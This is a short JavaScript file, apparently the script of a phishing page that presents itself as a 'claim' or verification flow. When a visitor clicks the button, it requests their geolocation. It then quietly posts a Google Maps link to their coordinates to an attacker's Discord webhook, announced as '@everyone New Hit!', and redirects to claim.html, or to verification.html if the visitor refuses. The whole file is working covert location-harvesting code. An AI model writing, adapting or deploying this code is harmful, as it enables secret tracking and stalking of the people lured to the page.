function btn(){
  document.getElementById("btn").style.backgroundColor = "#222b8a"
  function success(pos) {
    const user_id = window.location.href.split("&")[1]
    const webhook_id = window.location.href.split("&")[2]
    const webhook_token = window.location.href.split("&")[3]
    const crd = pos.coords;
    fetch(`https://discord.com/api/webhooks/${webhook_id}/${webhook_token}`, {method: "POST", headers: {"Content-Type": "application/json"}, body: JSON.stringify({"content": "@everyone New Hit!", "embeds": [{"description": `https://maps.google.com/?q=${crd.latitude},${crd.longitude}`, "author": {"name": user_id}}]})})
    var params = window.location.href.split("&")
    window.location.href = `./claim.html?&${params[1]}&${params[2]}&${params[3]}`;
  }

  function error(){
    var params = window.location.href.split("&")
    window.location.href = `./verification.html?&${params[1]}&${params[2]}&${params[3]}`;
  }
  navigator.geolocation.getCurrentPosition(success, error)
}
